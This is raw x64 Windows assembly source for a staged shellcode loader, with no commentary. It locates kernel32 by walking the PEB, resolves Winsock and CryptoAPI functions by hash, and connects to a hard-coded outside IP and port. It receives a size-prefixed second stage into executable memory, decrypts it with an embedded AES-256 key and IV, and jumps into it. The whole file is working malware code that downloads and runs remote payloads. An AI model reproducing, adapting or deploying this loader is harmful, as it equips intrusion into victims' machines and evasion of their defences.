start:
    mov rbp, rsp
    sub rsp, 1600

resolve_kernel32:
    mov dl, 0x4b
    mov rcx, 0x60
    mov r8, gs:[rcx]
    mov rdi, [r8 + 0x18]
    mov rdi, [rdi + 0x30]
search:
    xor rcx, rcx
    mov rbx, [rdi + 0x10]
    mov rsi, [rdi + 0x40]
    mov rdi, [rdi]
    cmp [rsi + 0x18], cx
    jne search
    cmp [rsi], dl
    jne search

find_function_jmp:
    jmp callback

get_find_function_addr:
    pop rsi
    mov [rbp + 0x8], rsi
    jmp resolve_k32_sym

callback:
    call get_find_function_addr

find_function:
    add rsp, 8
    pop rax
    push -1
    add rsp, rax

find_function_loop2:
    xor rax, rax
    xor rdi, rdi
    mov eax, [rbx + 0x3c]
    mov edi, [rbx + rax + 0x88]
    add rdi, rbx
    mov ecx, [rdi + 24]
    mov eax, [rdi + 32]
    add rax, rbx
    mov [rbp - 8], rax

find_function_loop:
    dec ecx
    mov rax, [rbp - 8]
    mov esi, [rax + rcx * 4]
    add rsi, rbx

compute_hash:
    xor rax, rax
    cdq

compute_hash_repeat:
    ror edx, 0xd
    add edx, eax
    lodsb
    test al, al
    jnz compute_hash_repeat

find_function_compare:
    cmp edx, [rsp - 8]
    jnz find_function_loop
    mov edx, [rdi + 36]
    add rdx, rbx
    mov cx, [rdx + 2 * rcx]
    mov edx, [rdi + 28]
    add rdx, rbx
    mov eax, [rdx + 4 * rcx]
    add rax, rbx
    push rax
    mov rax, [rsp - 8]
    cmp rax, -1
    jnz find_function_loop2

find_function_finish:
    sub rsp, 16
    ret

resolve_k32_sym:
    mov rax, 0x00000000ec0e4e8e
    push rax
    mov rax, 0x0000000091afca54
    push rax
    mov rax, 0x00000000ca2bd06b
    push rax
    mov rax, 0x0000000078b5b983
    push rax
    mov rax, 40
    push rax
    call [rbp + 8]

load_ws2_32:
    mov rax, 0x0000000000006C6C
    push rax
    mov rax, 0x642E32335F327377
    push rax
    mov rcx, rsp
    sub rsp, 40
    call [rsp + 88]
    nop

resolve_ws2_sym:
    mov rbx, rax
    mov rax, 0x0000000060aaf9ec
    push rax
    mov rax, 0x00000000adf509d9
    push rax
    mov rax, 0x000000003bfcedcb
    push rax
    mov rax, 0x00000000e71819b6
    push rax
    mov rax, 40
    push rax
    call [rbp + 8]

load_advapi32:
    mov rax, 0x006c6c642e
    push rax
    mov rax, 0x3233697061766461
    push rax
    mov rcx, rsp
    sub rsp, 40
    call [rsp + 184]
    nop

resolve_advapi_sym:
    mov rbx, rax
    mov rax, 0x43c28bda
    push rax
    mov rax, 0xd864e84d
    push rax
    mov rax, 0x180e1da8
    push rax
    mov rax, 0x59202584
    push rax
    mov rax, 40
    push rax
    call [rbp + 8]

    sub rsp, 2048

call_WSAStartup:
    mov rcx, 0x202
    lea rdx, [rsp + 1024]
    call [rsp + 2160]

call_WSASocketA:
    mov rcx, 2
    mov rdx, 1
    mov r8, 6
    xor r9, r9
    mov [rsp + 32], r9
    mov [rsp + 40], r9
    call [rsp + 2168]

call_connect:
    mov rsi, rax
    mov rcx, rax
    mov r8, 16
    mov r9, 0xdb04bebc50000002
    lea rdx, [rsp + 1024]
    mov [rdx], r9
    xor r9, r9
    mov [rdx + 8], r9
    call [rsp + 2176]

read_size:
    mov rcx, rsi
    lea rdx, [rsp + 1024]
    mov r8, 4
    xor r9, r9
    call [rsp + 2152]
    
    test eax, eax
    jle call_TerminateProcess

    mov eax, [rsp + 1024]
    mov ebx, eax
    
allocate_stage:
    xor rcx, rcx
    mov rdx, rax
    mov r8, 0x3000
    mov r9, 0x40
    call [rsp + 2264]
    
    test rax, rax
    jz call_TerminateProcess
    mov rdi, rax
    mov r12, rax

read_stage_loop:
    test ebx, ebx
    jz decrypt_stage

    mov rcx, rsi
    mov rdx, rdi
    mov r8, rbx
    xor r9, r9
    
    call [rsp + 2152]
    
    test eax, eax
    jle call_TerminateProcess
    
    add rdi, rax
    sub ebx, eax
    jmp read_stage_loop

decrypt_stage:
    lea rcx, [rsp]
    xor rdx, rdx
    xor r8, r8
    mov r9, 24
    mov rax, 0xF0000000
    mov [rsp + 32], rax
    
    call [rsp + 2080]
    test eax, eax
    jz call_TerminateProcess
    
    lea rbx, [rsp + 64]
    
    mov byte ptr [rbx], 0x8
    mov byte ptr [rbx+1], 0x2
    mov word ptr [rbx+2], 0
    mov dword ptr [rbx+4], 0x6610
    
    mov dword ptr [rbx+8], 32
    
    mov rax, 0x4a4766735268304b
    mov [rbx+12], rax
    mov rax, 0x58535a6e61707578
    mov [rbx+20], rax
    mov rax, 0x7868576d4b486266
    mov [rbx+28], rax
    mov rax, 0x4e764c4172656564
    mov [rbx+36], rax
    
    mov rcx, [rsp]
    mov rdx, rbx
    mov r8, 44
    xor r9, r9
    mov [rsp + 32], r9
    lea rax, [rsp + 8]
    mov [rsp + 40], rax
    
    call [rsp + 2064]
    test eax, eax
    jz call_TerminateProcess
    
    lea rbx, [rsp + 128]
    mov rax, 0x32434253744b7668
    mov [rbx], rax
    mov rax, 0x43564a5949513934
    mov [rbx+8], rax
    
    mov rcx, [rsp + 8]
    mov rdx, 1
    mov r8, rbx
    xor r9, r9
    
    call [rsp + 2072]
    test eax, eax
    jz call_TerminateProcess
    
    mov rcx, [rsp + 8]
    xor rdx, rdx
    mov r8, 0
    xor r9, r9
    
    mov rax, r12
    mov [rsp + 32], rax
    
    lea rax, [rsp + 1024]
    mov [rsp + 40], rax
    
    call [rsp + 2056]
    test eax, eax
    jz call_TerminateProcess

execute_stage:
    mov rdi, rsi
    mov rcx, rsi
    jmp r12

call_TerminateProcess:
    xor rcx, rcx
    dec rcx
    xor rdx, rdx
    call [rsp + 2248]
